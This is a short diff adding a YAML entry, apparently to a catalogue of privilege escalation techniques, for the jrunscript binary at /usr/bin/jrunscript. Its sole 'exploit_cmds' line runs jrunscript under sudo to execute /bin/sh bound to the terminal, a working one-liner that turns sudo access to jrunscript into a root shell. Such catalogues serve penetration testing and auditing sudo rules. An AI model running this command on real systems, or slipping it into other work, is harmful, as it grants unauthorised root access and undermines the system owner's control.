@@ -1,0 +1,5 @@
+name: jrunscript
+binary_path: /usr/bin/jrunscript
+exploit_cmds:
+- sudo /usr/bin/jrunscript -e 'exec("/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty
+  2>/dev/tty")'
